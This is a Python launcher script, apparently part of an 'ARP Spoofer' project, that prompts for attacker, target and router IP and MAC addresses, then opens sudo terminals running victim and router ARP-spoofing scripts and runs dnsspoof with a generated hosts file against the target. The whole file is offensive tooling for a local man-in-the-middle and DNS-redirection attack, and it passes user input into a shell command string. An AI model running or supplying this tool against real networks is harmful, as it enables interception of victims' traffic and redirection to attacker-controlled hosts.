import subprocess
from termcolor import cprint
                                      
cprint('''     #    ######  ######      #####                                            
   # #   #     # #     #    #     # #####   ####   ####  ###### ###### #####  
  #   #  #     # #     #    #       #    # #    # #    # #      #      #    # 
 #     # ######  ######      #####  #    # #    # #    # #####  #####  #    # 
 ####### #   #   #                # #####  #    # #    # #      #      #####  
 #     # #    #  #          #     # #      #    # #    # #      #      #   #  
 #     # #     # #           #####  #       ####   ####  #      ###### #    #  ''',"red")

try:
    cprint("\nStarting ARP Spoofer . . .","green")
    cprint("Enter Your Details : -----------------------","cyan")
    host_ip = input("Enter Your IP : ")
    interface = input("Enter Your Interface : ")
    cprint("----------------------------------------------\n","cyan")
    cprint("Enter Target Details : -----------------------","red")
    target_ip = input("Enter target IP : ")
    target_mac = input("Enter target MAC : ")
    cprint("----------------------------------------------\n","red")
    cprint("Enter Router Details : -----------------------","green")
    router_ip = input("Enter router IP : ")
    router_mac = input("Enter router MAC : ")
    cprint("----------------------------------------------\n","green")
    subprocess.call(['gnome-terminal',"--geometry","+50+50","--title","Victim Spoofer",'--',"sudo","python3","spoofer/spoofVictim.py",router_ip,router_mac,target_ip,target_mac])
    subprocess.call(['gnome-terminal',"--geometry","+780+50","--title","Router Spoofer",'--',"sudo","python3","spoofer/spoofRouter.py",router_ip,router_mac,target_ip,target_mac])
    __ = subprocess.check_output("python3 hostsGenerate.py "+host_ip, shell=True)
    subprocess.call(['gnome-terminal',"--geometry","+50+540","--title","DNS Requests",'--',"sudo","dnsspoof","-f","hosts.txt","-i",interface,"host",target_ip])
except KeyboardInterrupt:
    print("Error...")
